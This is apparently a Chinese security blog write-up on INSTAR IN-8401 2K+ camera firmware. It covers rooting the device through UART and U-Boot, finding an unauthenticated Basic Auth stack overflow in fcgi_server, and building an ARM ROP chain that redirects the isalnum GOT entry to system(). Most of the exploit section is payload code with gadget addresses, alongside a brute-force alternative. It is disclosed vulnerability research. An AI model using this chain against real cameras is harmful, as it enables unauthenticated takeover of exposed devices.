#  无泄漏也能打：INSTAR 摄像头固件到无 ASLR 泄漏 RCE  
 赛博安全攻防日记   2026-09-11 05:36  
  
# 无泄漏也能打：INSTAR 摄像头固件到无 ASLR 泄漏 RCE  
  
上一篇写 ARM 利用时，是对着一个已知漏洞把 exploit 搭起来。这次我想换个更「现代」的 IoT 目标，把链路走完整：固件提取与分析 → 挖到未知漏洞 → 一路打到利用。跟着一起看，怎么在没有地址泄漏的前提下，用 ARM ROP chain 绕过 ASLR，拿下未认证 RCE。  
## 目标概览  
  
研究对象是德国厂商 INSTAR 的 IN-8401 2K+ 网络摄像头：带网页配置和实时预览。后来发现这款固件也和其他 2K+ / 4K 系列共用。Shodan 上大约能看到 12,000 台 INSTAR 设备暴露在公网。  
  
![INSTAR IN-8401 2K+ 网页界面](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84WOMJTjax30OlgicvzXkMwp62nUI6tX0epXO4pYnrC028eaAiaUcoOT1f16sOwiazffYulyXHtdibJicAAYiaj6lUZvZ89ZWW3JH1cj4/640?wx_fmt=jpeg&from=appmsg "")  
  
INSTAR IN-8401 2K+ 网页界面  
## 撬开外壳：先拿固件  
  
想认真挖洞，得先摸到固件。有了固件才能看二进制、配置、脚本和文件系统布局，静态分析和动态调试才站得住；否则就只能对着网络接口瞎 fuzz。  
  
动手前先尽可能多收集信息。INSTAR 文档挺全，其中一页叫「Restore your HD Camera after a faulty Firmware upgrade」特别有意思：说明摄像头暴露了 UART，还能用来恢复固件镜像。UART 是嵌入式里常见的串口调试接口。文档看起来甚至能直接进 root shell。  
  
文章是写给 HD 型号的，不是我的 2K+，但厂商经常跨代复用硬件和功能，值得一试。拆掉外壳前盖后，调试接口就在 wiki 图示的位置。  
  
接着用 PCBite 夹到接口上，接到 FTDI（USB 转串口）上。  
  
![把 FTDI 接到暴露的 UART 接口](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JdicK53hX84Uw5pyvY4wse8o3YIekmrIIqmbHtywVw6urAGcia1UyFwGq9HmPpos4HI7icXI2txb3sTRut75IeyWono6s7DibhyWgyjegrzXt4U/640?wx_fmt=jpeg&from=appmsg "")  
  
把 FTDI 接到暴露的 UART 接口  
  
插到 Linux 机器上打开串口，敲两下，登录提示就出来了：  
```
INSTAR login: rootPassword:Login incorrect
```  
  
试了 admin:admin、root:root 这类常见组合，都不行。文档说可以打断启动流程拿 OS 上的 root shell，于是重启摄像头再试。  
```
U-Boot 2019.04 (Oct 18 2023 - 11:38:25 +0000)CPU:   Novatek NT @ 999 MHzDRAM:  512 MiBRelocation to 0x1ff3b000, Offset is 0x01f3b000 sp at 1fbf4dc0nvt_shminfo_init:  The fdt buffer addr: 0x1fbfb8c8ARM CA9 global timer had already been initiatedotp_init!120MHzotp_timing_reg= 0xff6050 CONFIG_MEM_SIZE                =      0x20000000 CONFIG_NVT_UIMAGE_SIZE         =      0x01900000 CONFIG_NVT_ALL_IN_ONE_IMG_SIZE =      0x14a00000 CONFIG_UBOOT_SDRAM_BASE        =      0x1e000000 CONFIG_UBOOT_SDRAM_SIZE        =      0x01fc0000 CONFIG_LINUX_SDRAM_BASE        =      0x01100000 CONFIG_LINUX_SDRAM_SIZE        =      0x1cf00000 CONFIG_LINUX_SDRAM_START       =      0x1c700000[...]phy interface: INTERNAL MIIeth_na51055Hit any key to stop autoboot:  0 do_nvt_boot_cmd: boot time: 1718855(us) [...]
```  
  
确实能打断 autoboot，但和文档不一样：打断后进的不是系统 root shell，而是 U-Boot。U-Boot（Universal Bootloader）是嵌入式里常见的开源 bootloader，负责初始化硬件、加载操作系统/固件。  
```
nvt@na51055: printenvarch=arm[...]bootargs=console=ttyS0,115200 earlyprintk nvt_pst=/dev/mmcblk2p0nvtemmcpart=0x40000@0x40000(fdt)ro,0x200000@0xc0000(uboot)ro,0x40000@0x2c0000(uenv),0x400000@0x300000(linux)ro,0x40000000@0xb00000(rootfs0),0xc000000@0x40b00000(rootfs1),0x40000000@0x4cb00000(rootfs2),0x1000000@0x8CF00000(rootfsl1),0x10000000@0x8E300000(rootfsl2),0xe6a340@0(total) root=/dev/mmcblk2p1 rootfstype=ext4 rootwait rwbootcmd=nvt_boot[...]vendor=novatekver=U-Boot 2019.04 (Oct 18 2023 - 11:38:25 +0000)
```  
  
注意到内核启动参数来自环境变量 bootargs  
。我试了经典的 init=/bin/sh  
：让内核别跑 init，直接起 shell。改完变量后用 nvt_boot  
 启动。  
```
invt@na51055: setenv bootargs "console=ttyS0,115200 earlyprintk nvt_pst=/dev/mmcblk2p0nvtemmcpart=0x40000@0x40000(fdt)ro,0x200000@0xc0000(uboot)ro,0x40000@0x2c0000(uenv),0x400000@0x300000(linux)ro,0x40000000@0xb00000(rootfs0),0xc000000@0x40b00000(rootfs1),0x40000000@0x4cb00000(rootfs2),0x1000000@0x8CF00000(rootfsl1),0x10000000@0x8E300000(rootfsl2),0xe6a340@0(total) root=/dev/mmcblk2p1 rootfstype=ext4 rootwait rw init=/bin/sh"nvt@na51055: nvt_boot[...]EXT4-fs (mmcblk2p1): recovery completeEXT4-fs (mmcblk2p1): mounted filesystem with ordered data mode. Opts: (null)VFS: Mounted root (ext4 filesystem) on device 179:1.devtmpfs: mountedFreeing unused kernel memory: 1024KRun /bin/sh as init process/bin/sh: can't access tty; job control turned off/ # iduid=0(root) gid=0(root)/ # hostnameINSTAR
```  
  
成了。我加了个新的 root 用户再重启，就能用新账号登录。接着把整棵文件系统 dump 下来做分析和备份——后面万一玩炸了还能还原。  
## 高层架构与攻击面  
  
设备打开后很容易被好奇心带着乱跑。目标是找可利用漏洞，得先画一张攻击面地图。  
  
Web 栈里最显眼的是 lighttpd：入口兼反向代理。看配置就能明白，进来的请求会转到对应后端。例如以 .cgi  
 结尾的请求，会经 /tmp/instt_fcgi.socket  
 丢给 fcgi_server  
。  
```
fastcgi.server = ( ".cgi" => (("bin-path" => "/home/ipc/bin/fcgi_server","socket" => "/tmp/instt_fcgi.socket","max-procs" => 1,"check-local" => "disable"))
```  
  
我更关心**未认证就能摸到的代码**  
。前期探索知道 Web 用户存在 SQLite 里，负责认证的二进制理应访问这个库；但看不到 fcgi_server  
 在碰它，说明还有别的组件。进程列表里有个 ipc_server  
。挂上 strace  
 后发现：多数接口的请求会从 fcgi_server  
 经 /tmp/insttv2_socket  
 转到 ipc_server  
。  
  
举例：  
```
$ curl '192.168.0.3/param.cgi?cmd=mod0&paramkey=paramvalue'cmd="mod0";response="204";
```  
  
ipc_server  
 这一侧：  
```
recv(91, "\4cmd\0\3\5\0\0\0mod0\0\6param\0\4\32\0\0\0\tparamkey\0\3\v\0\0\0paramvalue\0\7header\0\4\25\0\0\0\3ip\0\3\f\0\0\000192.168.0.1\0", 87, 0) = 87
```  
  
HTTP 请求并不是原样转发，而是先序列化成某种 TLV（Type–Length–Value）结构。认证和核心业务逻辑都在 ipc_server  
 后端。  
  
至此两个有意思的目标清楚了：fcgi_server  
 和 ipc_server  
，都在未认证攻击者的可达范围内。  
## 方法论  
  
目标明确后开始挖洞。简单说说用过的方法。  
  
高效挖洞很吃调试环境：静态分析里的假设能马上在动态里验证，也能追调用链。这套和上次研究差不多——摄像头上跑 gdb server，攻击机上 gdb client。  
  
两条主线：fuzzing，以及静态+动态分析结合。先用 boofuzz 对收集到的 Web 接口做了比较「原始」的黑盒 fuzz，扫各种参数看能不能打崩。这条路确实打出了 CVE-2025-8761，但效率很低——从外部几乎只能稳定观察到整机崩溃（后面会解释为什么）。  
  
第二条线花在逆向 fcgi_server  
 和 ipc_server  
 上：搞清逻辑，盯着边界检查、指针运算这些内存破坏常客。节奏通常是：看反编译 → 做假设 → 用 gdb  
 / strace  
 动态验证。  
## 挖洞过程  
  
先看代码。fcgi_server  
 像一层自定义中间件，把 Web 请求翻译成 ipc 消息。反编译里能看到 .cgi  
 端点的分发器，按 URI 调不同 handler。  
  
![反编译后的 fcgi_server 分发函数](https://mmbiz.qpic.cn/sz_mmbiz_png/JdicK53hX84Via0RC5Hr89ZRWAd4cfwrfWGJ0rhkOyX46Igg4IgRSAJEbicOwNNbs9b0GmHHNnbUfLsZ7eh1UobJnibE9sxKGv0nM12YTeUgLnI/640?wx_fmt=png&from=appmsg "")  
  
反编译后的 fcgi_server 分发函数  
  
多数 handler 里会出现同一类模式：再调一个「像分发器」的函数。我把它识别成认证处理逻辑。  
  
![反编译后的 update 处理函数](https://mmbiz.qpic.cn/sz_mmbiz_png/JdicK53hX84VlJ64AznDdjaLsnoJ9neeb793rEuyvHn1pP3uBricagGd3lWo01rN7yp9XWib6dSb9uMibugf114QHWeyibQbiab756uS9Pc7Hibfds/640?wx_fmt=png&from=appmsg "")  
  
反编译后的 update 处理函数  
  
按认证方式不同，提取/序列化 auth 数据的路径也不一样。其中一条是 Basic Auth handler。  
  
![反编译后的认证处理函数](https://mmbiz.qpic.cn/sz_mmbiz_png/JdicK53hX84WSnZtSDqL23DWoDaG3YsibnVFHkHic3LzLqib5vblfpWSgeXh0Tutuica63g5NqtaxufNTSEn56Ribm3qE7ibiaGIZayJuFoILQY5rjo/640?wx_fmt=png&from=appmsg "")  
  
反编译后的认证处理函数  
  
Basic Auth handler 里又调了一个看起来像自定义 Base64 解码的函数。反编译里能看到不少 C++ 味道：成员函数、this 指针、标准库引用。多数字符串操作走的是 C++ string；但这里有个 memcpy  
，把 Base64 解码结果拷进栈上固定 516 字节的缓冲区。  
  
![反编译后的 Base64 解码函数](https://mmbiz.qpic.cn/sz_mmbiz_png/JdicK53hX84WQYNnVp9tfmfKemX8u6LELQLobKzNbQMebhoWib5WkQOQn7e7WGnQeHVTIjFDvLflDpaCm0rONuNfjk8MiatYibsHNVxdDDibWM5c/640?wx_fmt=png&from=appmsg "")  
  
反编译后的 Base64 解码函数  
  
静态分析先告一段落，转向动态验证 Basic Auth。先确认 Basic Auth handler 和 Base64 解码确实会被触发：下几个断点，发请求。  
```
$ curl -k https://192.168.0.3/castore.cgi -u 'A:B' -v[...]* Request completely sent off* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):< HTTP/2 500< content-type: text/plain; charset=utf-8[...]< server: lighttpd/1.4.72
```  
  
断点命中，假设成立，返回 500。  
  
再发一条特别长的 Basic Auth，故意超过 Base64 解码里那 516 字节缓冲区。  
```
$ curl -k https://192.168.0.3/castore.cgi -u 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:B' -v[...]* Request completely sent off* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):< HTTP/2 500< content-type: text/html[...]< server: lighttpd/1.4.72<<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"> <head>  <title>500 Internal Server Error</title> </head> <body>  <h1>500 Internal Server Error</h1> </body></html>
```  
  
又是 500，但响应体不一样了——这次是 HTML 错误页。串口那边更有意思：  
```
Hardware name: Novatek Video PlatformPC is at 0x41414140LR is at 0x76e39e8cpc : [<41414140>]    lr : [<76e39e8c>]    psr: 60010030sp : 753808d0  ip : 76e6f48c  fp : 41414141r10: 41414141  r9 : 41414141  r8 : 41414141r7 : 41414141  r6 : 41414141  r5 : 41414141  r4 : 41414141r3 : 00000000  r2 : 75380698  r1 : 00000000  r0 : 75380698Flags: nZCv  IRQs on  FIQs on  Mode USER_32  ISA Thumb  Segment userControl: 10c5387d  Table: 4dbdc04a  DAC: 00000055CPU: 1 PID: 6392 Comm: fcgi_server Tainted: P           O      4.19.91 #1Hardware name: Novatek Video PlatformBacktrace:[<8010b428>] (dump_backtrace) from [<8010b554>] (show_stack+0x18/0x1c) r7:41414140 r6:60070013 r5:00000000 r4:808405e4[...]
```  
  
程序崩了。PC is at 0x41414140  
 说明栈被覆盖：返回地址从栈上取出来后跳到了 payload 对应的地址。栈溢出坐实。  
  
为什么最初 fuzz 没挖到？两个原因：  
- HTTP 状态码和正常失败一样都是 500，只是 body 不同；光看 500 并不稀奇。  
  
- lighttpd 会立刻把 fcgi_server  
 拉起来，从外面几乎感觉不到崩溃。  
  
这也再次说明：调试环境有多重要。  
## 利用  
  
开搞之前提醒一句：如果不熟二进制利用或 ARM，建议先看作者上一篇相关文章——很多概念一脉相承，这里不再展开。  
  
先看利用前置条件。目标是 ARMHF 32 位、动态链接、stripped。checksec  
 显示：无 stack canary，开了 NX；不是 PIE；Partial RELRO。  
```
$ file fcgi_serverfcgi_server: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 4.9.0, stripped
```  
```
$ checksec --file=fcgi_serverRELRO           STACK CANARY      NX            PIEPartial RELRO   No canary found   NX enabled    No PIE
```  
  
对攻击者意味着什么？没有 canary，用溢出改返回地址很直接；但栈上不能跑 shellcode。因为不是 PIE，主程序装载地址固定。Partial RELRO 下 GOT 在 BSS 前面，能挡住「全局缓冲区溢出改 GOT」这类路径；我们的溢出在栈上，这一点不关键——但 GOT **可写**  
很关键，只有 Full RELRO 才会把 GOT 变成只读。  
  
再看依赖库，比如 libc：带 PIE，运行时会被随机摆放。  
```
$ checksec --file=libc-2.29.soRELRO           STACK CANARY      NX            PIEPartial RELRO   Canary found      NX enabled    DSO
```  
  
综合缓解措施，用 ROP（Return-oriented programming）拿命令执行最合理：串起程序内存里已有的 gadget，拼出攻击者控制的执行流。ROP 是否打得动，取决于 gadget 够不够、地址知不知道。  
  
fcgi_server  
 自己的 gadget 地址是静态可知的，但数量有限；最终总要调到 libc 的文件 I/O 或 system()  
。而 libc 带 PIE，设备上 ASLR 也开着，libc 基址随机。  
  
当时想到几条路：  
- 再挖一个洞泄漏 libc 地址  
  
- 找办法读 /proc/self/maps  
  
- 用 ROP chain 自己把 libc 地址洩出来  
  
很快再挖泄漏洞没成；读 maps 也没走通；用目标二进制 gadget 做泄漏又缺少顺手的外泄通道。  
  
更大的问题是：ROP 一跑二进制就崩，泄漏也白搭——fcgi_server  
 重启后 libc 又换地方了。栈溢出场景下也没法把栈「修」回原样，因为修栈需要的信息本身就被盖掉了。  
  
常见做法是多次触发：先泄漏，再回到漏洞函数，第二次溢出用泄漏结果。但这需要能读泄漏、再喂输入的 I/O 通道。结合 Web 栈架构和漏洞位置，这条路不现实，所以更倾向 **one-shot**  
。  
### 计划  
  
绕 ASLR 有一类手法围着 GOT / PLT 转。调用外部函数（比如 libc 的 puts  
）时，先落到 puts@plt  
，由它解析真正的 libc 地址并写入 GOT；之后再调就直接从 GOT 取。  
  
绕 ASLR 需要的信息就在 GOT 里。理想情况是 GOT 里已有 system  
，但目标二进制从不引用 system  
，自然没有对应 GOT/PLT 项。可以读某个已解析函数的 GOT，算出到目标函数的偏移，再改执行流——全程得用二进制里的 gadget 完成。  
  
高层步骤可以是：  
- 读某个 GOT 项，放进寄存器 x  
  
- 对 x 做加减，挪到目标函数（如 system  
）  
  
- 跳到 x  
  
或者：  
- 直接改写 GOT 指针指向的值（GOT 可写）  
  
- 解引用 GOT 到寄存器 x  
  
- 跳到 x  
  
当然还要在跳 system()  
 前把参数塞进正确寄存器，但方向有了。  
### 找零件  
  
先找一个触发漏洞时**已经被填充**  
的 GOT 项。脆弱的 Base64 解码里会调 libc 的 isalnum  
。看它的 PLT / GOT：  
```
objdump -d fcgi_server| grep '<isalnum@plt>'000147e8 <isalnum@plt>:   206c8:       ebffd046        bl      147e8 <isalnum@plt>   21010:       ebffcdf4        bl      147e8 <isalnum@plt>
```  
  
溢出后的返回处下断，确认运行时 GOT 与真实地址：  
```
(remote) gef➤  info address isalnum@got.pltSymbol "isalnum@got.plt" is at 0x400c8 in a file compiled without debugging.(remote) gef➤  x/wx 0x400c80x400c8 <isalnum@got.plt>:      0x76ba86f0(remote) gef➤  x/8i 0x76ba86f0   0x76ba86f0 <isalnum>:        ldr     r3, [pc, #24]   @ 0x76ba8710 <isalnum+32>   0x76ba86f4 <isalnum+4>:      mrc     15, 0, r2, cr13, cr0, {3}   0x76ba86f8 <isalnum+8>:      lsl     r0, r0, #1   0x76ba86fc <isalnum+12>:     ldr     r3, [pc, r3]   0x76ba8700 <isalnum+16>:     ldr     r3, [r2, r3]   0x76ba8704 <isalnum+20>:     ldrh    r0, [r3, r0]   0x76ba8708 <isalnum+24>:     and     r0, r0, #8   0x76ba870c <isalnum+28>:     bx      lr
```  
  
GOT 在 0x400c8  
，指向 libc 里 isalnum  
 的 0x76ba86f0  
。  
```
(remote) gef➤  info function systemAll functions matching regular expression "system":Non-debugging symbols:0x000147c4  std::_V2::system_category()@plt[...]0x76bbb920  __libc_system0x76bbb920  system0x76c83fac  svcerr_systemerr
```  
  
isalnum  
（0x76ba86f0）和 system  
（0x76bbb920）差多少？  
```
>>> hex(0x76bbb920 - 0x76ba86f0)'0x13230'
```  
  
只要能给 isalnum@got  
 里的地址加上 0x13230  
，就得到 system  
。  
### Gadgets，还是 Gadgets  
  
计划和 RCE 之间，隔着一堆 gadget。先试过 angrop  
 这类自动串联工具，但 ARM 上同一件小事往往有很多种多指令写法（给寄存器加值、寄存器互搬……）。工具对短而直白的 gadget 还行，一复杂就抓瞎。最后还是用 Ropper  
 手工搜、手工串。  
  
短 gadget 不够用时只能上更长的；越长副作用越多——覆盖寄存器、挪栈指针之类。挑战在于：既要完成原语，又要把副作用控制在后续 gadget 能纠正的范围内。  
  
链子里最关键的是「把两个尽量可控的值加起来」：这样才能把算好的偏移加到 isalnum@got  
 上得到 system  
。只有给寄存器 +1/+2 的 gadget 不太香——要么循环调很多次，要么链子长到离谱。于是找了这种两寄存器相加的：  
```
# 0x000228d8: add r6, fp, r6; ldrb sb, [ip, #1]; ldr sl, [ip, #2]; blx r3;
```  
  
拆开看：  
- add r6, fp, r6  
：fp（r11）+ r6 → r6  
  
- ldrb sb, [ip, #1]  
：解引用 ip（r12）+1 → sb（r9）  
  
- ldr sl, [ip, #2]  
：解引用 ip+2 → sl（r10）  
  
- blx r3  
：跳到 r3  
  
副作用也包括：某些寄存器必须事先是合法值。这里 ip（r12）必须是可解引用的有效地址，否则直接崩。  
  
理想情况：r6 里是 isalnum  
 地址，fp 里是算好的偏移，gadget 输出就是 system  
 地址。那 isalnum  
 怎么进 r6？isalnum@got  
 地址已知，需要 gadget 解引用它。  
```
# 0x000190ac: ldr r6, [r3, #0x10]; ldr r3, [r2, #4]; blx r3;
```  
  
拆开：  
- ldr r6, [r3, #0x10]  
：*(r3+0x10) → r6  
  
- ldr r3, [r2, #4]  
：*(r2+0x4) → r3  
  
- blx r3  
：跳到 r3  
  
正是需要的，但前置条件苛刻：要让 *(r2+0x4)  
 等于下一条 gadget，链才能续上。  
  
最后还差「跳到算好的地址」的 gadget——愣是没找到；也没法把地址挪到已有 call gadget 的寄存器。转机是：目标二进制的 GOT **可写**  
。那就把算好的地址写回 GOT，再调 isalnum@plt  
，PLT stub 会从被篡改的 GOT 取地址并跳转。  
```
# 0x0002a3f8: str r0, [r4, #4]; pop {r4, r5, r6, pc};
```  
  
拆开：  
- str r0, [r4, #4]  
：把 r0 写到 *(r4+0x4)  
  
- pop {r4, r5, r6, pc}  
：继续链  
  
只要能把算好的地址放进 r0、把 isalnum@got - 0x4  
 放进 r4，就能把篡改后的地址写回 GOT。  
  
对齐之后，计划是：  
- 解引用 isalnum@got  
 → r6  
  
- 给 r6 加上到 system  
 的偏移  
  
- 把 r6 写回 isalnum@got  
  
- 准备 system  
 的参数  
  
- 调用 isalnum@plt  
  
### 串起整条链  
  
实际远没有上面写得顺。gadget 换来换去很多次，才固定成下面这条。脆弱 Base64 函数的 epilogue 很方便：返回前能填充 r4–r11，再跳进第一条 gadget。这里先给 r6、r9、r11 埋点。  
```
p = b""p += 516 * b"A"p += b"BBBB" # r4p += b"CCCC" # r5p += p32(0x1cad0) # r6p += b"EEEE" # r7p += b"FFFF" # r8p += p32(0x190ac) # r9 (sb)p += b"HHHH" # r10 (sl)p += p32(0x13230) # r11 (fp) -> offset system - isalnum
```  
  
链的第一步做准备：  
```
# 0x00028a08: mov r0, r6; pop {r4, r5, r6, pc};p += p32(0x28a08)p += b"XXXX" # r4p += b"XXXX" # r5p += b"XXXX" # r6# 0x0001459c: pop {r3, pc};p += p32(0x1459c)p += p32(ISALNUM_GOT - 0x10) # r3# 0x0002a33c: mov r2, sp; str r0, [sp, #4]; mov r0, r3; blx sb;p += p32(0x2a33c)p += b"AAAA" # <- sp
```  
  
等价于：  
```
r0 = r6 = 0x1cad0r3 = ISALNUM_GOT - 0x10r2 = sp*(sp + 4) = r0 = 0x1cad0r0 = r3 = ISALNUM_GOT - 0x10*(0x190ac)()
```  
  
注意把 isalnum@got  
 放进 r3，好让下一条解引用进 r6；同时 r2 要是栈指针，才能靠 blx r3  
 续链。  
```
# 0x000190ac: ldr r6, [r3, #0x10]; ldr r3, [r2, #4]; blx r3;
```  
```
r6 = *(r3 + 0x10) = *(ISALNUM_GOT - 0x10 + 0x10) = *ISALNUM_GOTr3 = *(r2 + 0x4) = *(sp + 0x4)*(sp + 0x4)() # -> 0x1cad0
```  
  
*(sp+0x4)  
 会在运行时被覆盖，所以栈上要留好 scratch，对齐才不会乱。  
  
跳到 0x1cad0 时栈大致是：  
<table><caption><section><span leaf=""><br/></span></section></caption><tfoot><tr><td></td></tr></tfoot><colgroup><col/><col/><col/></colgroup></table><table><tbody><tr><th style="border: 1px solid rgb(221, 221, 221);padding: 6px 8px;text-align: left;"><section><span leaf="">Address</span></section></th><th style="border: 1px solid rgb(221, 221, 221);padding: 6px 8px;text-align: left;"><section><span leaf="">Value</span></section></th><th style="border: 1px solid rgb(221, 221, 221);padding: 6px 8px;text-align: left;"><section><span leaf=""><br/></span></section></th></tr><tr><td style="border: 1px solid rgb(221, 221, 221);padding: 6px 8px;text-align: left;"><section><span leaf="">0x1000FFF8</span></section></td><td style="border: 1px solid rgb(221, 221, 221);padding: 6px 8px;text-align: left;"><section><span leaf="">0x1459c</span></section></td><td style="border: 1px solid rgb(221, 221, 221);padding: 6px 8px;text-align: left;"><section><span leaf=""><br/></span></section></td></tr><tr><td style="border: 1px solid rgb(221, 221, 221);padding: 6px 8px;text-align: left;"><section><span leaf="">0x1000FFF4</span></section></td><td style="border: 1px solid rgb(221, 221, 221);padding: 6px 8px;text-align: left;"><section><span leaf="">0x1cad0</span></section></td><td style="border: 1px solid rgb(221, 221, 221);padding: 6px 8px;text-align: left;"><section><span leaf=""><br/></span></section></td></tr><tr><td style="border: 1px solid rgb(221, 221, 221);padding: 6px 8px;text-align: left;"><section><span leaf="">0x1000FFF0</span></section></td><td style="border: 1px solid rgb(221, 221, 221);padding: 6px 8px;text-align: left;"><section><span leaf="">AAAA</span></section></td><td style="border: 1px solid rgb(221, 221, 221);padding: 6px 8px;text-align: left;"><section><span leaf="">← stack pointer</span></section></td></tr></tbody></table>  
栈指针还停在 AAAA。接着再调栈、准备 r3：  
```
# 0x0001cad0: pop {r4, r5, pc};p += b"XXXX" # r5 (scratch space)# 0x0001459c: pop {r3, pc};p += p32(0x1459c)p += p32(0x27d14) # r3
```  
```
r3 = 0x27d14
```  
  
然后就是把 isalnum  
 地址和偏移加起来的 gadget。偏移一开始就放进了 fp（r11）；此时 r6 也已经是从 GOT 读出的 isalnum  
 真地址。  
```
# 0x000228d8: add r6, fp, r6; ldrb sb, [ip, #1]; ldr sl, [ip, #2]; blx r3;p += p32(0x228d8)
```  
```
r6 = r6 + fp = *ISALNUM_GOT + 0x13230 = systemsb = *(ip + 0x1)sl = *(ip + 0x2)*(0x27d14)()
```  
  
ip 后面用不到；它恰好指向栈上某地址，只读不会搞出额外破坏。  
```
# 0x00027d14: mov r0, r6; add sp, sp, #0x3c; pop {r4, r5, r6, r7, r8, sb, sl, fp, pc};p += 0x3c * b"P"p += p32(ISALNUM_GOT - 4) # r4 -> target - 4p += b"XXXX" # r5p += b"XXXX" # r6p += b"XXXX" # r7p += b"XXXX" # r8p += b"XXXX" # sbp += b"XXXX" # slp += b"XXXX" # fp
```  
  
下一步把 r6 挪进 r0（也就是把算好的 system  
 放进 r0），并为下一步准备 r4。这个 gadget 副作用不小，需要额外 padding。  
```
r0 = r6 = systemsp = sp + 0x3cr4 = ISALNUM_GOT - 4
```  
  
终于到写回 GOT 的 gadget：  
```
# 0x0002a3f8: str r0, [r4, #4]; pop {r4, r5, r6, pc};p += p32(0x2a3f8)p += b"XXXX" # r4p += b"XXXX" # r5p += p32(ISALNUM_PLT) # r6
```  
  
顺带还能把 isalnum@plt  
 写进 r6。  
```
*(r4 + 0x4) = r0 = *(ISALNUM_GOT - 0x4 + 0x4) = systemr6 = ISALNUM_PLT
```  
  
收尾：把栈指针放进 r0（第一个参数），再 call r6——之前已经塞好了 system  
 路径（经篡改 GOT 的 PLT）。  
```
# 0x0001fb04: mov r0, sp; blx r6;p += p32(0x1fb04)p += CMD.encode()p += b"\x00"
```  
  
实测：  
  
![最终 exploit：在目标设备拿到 root shell](https://mmbiz.qpic.cn/sz_mmbiz_png/JdicK53hX84V7MWWy4EzibU5ibReeCCNQKzgeBVj2qLNeA0ds0qQjxcIAG4vAhHHKYZN2G2RLsKI9yglBSrkVut5zLtCunHbsiaamd6px0pDkX0/640?wx_fmt=png&from=appmsg "")  
  
最终 exploit：在目标设备拿到 root shell  
  
RCE！  
### 为什么不直接……？  
  
细心的读者会问：都是 32 位了，为什么不暴力猜 system()  
 地址？确实可行——32 位地址空间比 64 位小得多，libc 可能落点也少很多。第一版 exploit 就是这么干的，能打。但试探正确地址的过程会不断打崩目标；红队场景下噪声太大，所以才改成更稳、更安静的这条链。  
## 收尾  
  
从固件提取分析，到定位漏洞，再到利用，整条路径走完。希望读起来和我挖的时候一样有意思。  
  
研究中发现的问题都走了负责任披露。感谢 INSTAR 响应迅速，很快修了并发布更新。90 天披露期已过，和这篇 writeup 一起，exploit 也公开在 这里。  
  
更多 IoT / 车联网 / 机器人 / AI 安全资料在星球里，扫码进「车联网攻防日记」。  
  
![知识星球二维码](https://mmbiz.qpic.cn/sz_mmbiz_png/JdicK53hX84UhZo5HDpUibuNu5FWBMd396s7pb16akaT740L16KGKGg6teEbgicyGRZhD3qNBepAdHhz8PpVjcyzPUVW9jASGvTmcegn2o4fd0/640?wx_fmt=png&from=appmsg "")  
  
  
